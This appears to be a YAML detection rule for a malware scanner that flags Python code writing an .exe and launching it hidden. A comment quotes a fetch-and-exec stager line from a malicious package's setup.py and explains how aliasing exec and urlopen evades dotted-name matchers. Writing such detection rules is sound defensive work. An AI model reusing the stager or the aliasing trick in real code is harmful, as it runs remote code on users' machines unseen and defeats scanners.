defaults:
  attack: T1105
  mbc: E1105
  platforms: [linux, macos, windows, unix, android, ios]
  for: [python]

composite_rules:
  - id: python-exe-write-hidden-launch
    desc: Python EXE write and hidden launch clues
    crit: hostile
    conf: 0.95
    near_lines: 5
    all:
      # Write to .exe file
      - id: micro-behaviors/fs/write/file/target::write-exe
      - id: micro-behaviors/process/create/subprocess/launch::process-execution
    any:
      - id: micro-behaviors/process/create/hidden
      - id: micro-behaviors/process/argument/visibility::powershell-bypass-file-hidden-flags
      - id: micro-behaviors/process/config/window::python-powershell-w-hidden
      - id: micro-behaviors/process/argument/visibility::argv-array-windowstyle-hidden
    unless:
      - id: well-known/app/system/anthropic-cybersecurity-skills::defensive-cybersecurity-skills-repository
    downgrade:
      any:
# An installer that writes a stager whose body is an aliased
# exec(urlopen('https://...').read()) chain, then hands it to the interpreter.
# The stager text lives inside the installer as a written literal, so the
# fetch and the exec never appear as real calls -- only as the payload the
# installer drops. Aliasing both primitives (urlopen as _ajasaa, exec as
# _xzzzx) is what keeps every dotted matcher blind.
#
# Worked example: `libsock4`, whose setup.py writes
# `_xzzzx=exec; _xzzzx(_ajasaa('https://pub-...r2.dev/...').read())` to a
# NamedTemporaryFile and starts it with pythonw.
        - id: metadata/path/directory::test-directory-component
